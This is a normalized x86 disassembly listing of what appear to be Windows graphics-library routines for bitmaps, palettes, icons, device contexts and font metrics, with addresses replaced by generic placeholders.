xor eax eax
push ebp
push sub_42111e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_415ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421092
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421156
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40c5b8
call sub_41ddb4
jmp r-xdata
sub_421092
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026ec
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_421156
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402b04
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4211eb
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41e5b8
mov [ ebp - 0x30 ] eax
sub_421208
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_420bbc
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42124c
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42094c
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_415ad0
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402b04
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_420bbc
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_420ce4
call sub_41ddb4
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_4212bc
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_42094c
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b04
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_41ff64
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_421357
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_420bbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_421380
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_420808
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_42094c
mov eax esi
call sub_420a5c
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_42094c
mov eax esi
call sub_420a5c
mov eax esi
call sub_4208d8
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_41ff64
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_420368
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_420bbc
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_420bbc
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_41f900
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4214b8
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_42095c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_420368
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42150c
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_42095c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_420368
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42158c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_42094c
mov eax ebx
call sub_42095c
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_41f900
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421623
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_420bbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_41f7f8
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_41bdc8
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_421628
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_40388c
call sub_4038e0
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_41f7f8
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421660
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_42095c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_420368
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4216bc
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b04
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_4208d8
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_41ecf4
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_415b08
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_415b08
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b04
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_42079c
mov dl [ r-xdata ]
call sub_41dbb0
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_41dec8
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_41f8b4
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_415b08
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_415b08
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_415b08
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_415b08
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_415b08
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_415b08
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_41e338
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_415b08
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_41e65c
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_42197c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_42095c
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_41f900
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_4219f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_41ff64
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_421a1c
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_4030f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_421a64
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41f030
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_41f72c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_421ab8
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_41f730
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413e30
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_421ae8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_421dc0
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_41f72c
mov eax [ esi + 0x28 ]
call sub_41f730
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_413e5c
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_421b48
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_41dbb0
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_421ba0
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_421bdc
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_4158c4
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_415ad0
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_41e908
jmp r-xdata
jmp r-xdata
call sub_41ddc0
sub_421c54
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421ce1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_421ba0
cmp eax [ rw-data ]
jne r-xdata
call sub_41ddc0
mov eax esi
call sub_421ba0
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_41ee34
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402b04
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_415b08
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_421d08
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421d96
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_4158a4
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_415ad0
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_415ad0
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_421dc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_41ddc0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421d9b
mov eax [ ebp - 0x4 ]
call sub_4030f0
call sub_40388c
call sub_4038e0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421dc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421e00
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f72c
mov eax [ ebx + 0x28 ]
call sub_41f730
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_421e80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_421c54
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_415b08
pop esi
pop ebx
retn
sub_421ed0
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_41e408
mov [ rw-data ] eax
pop ebx
retn
sub_421f08
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_421f4c
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_421f08
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_422018
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_422050
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax esi
call sub_422248
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_422094
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42207c
xor eax eax
push ebp
push sub_422135
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42213c
mov eax [ ebp - 0x4 ]
call sub_422088
retn
mov eax 0x10
call sub_4026cc
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_422148
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_422148
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4201d4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_422227
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_42079c
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_41d440
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_41d324
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_41242c
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_41d6c8
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_41da94
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_420458
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_422248
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42207c
xor eax eax
push ebp
push sub_422293
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
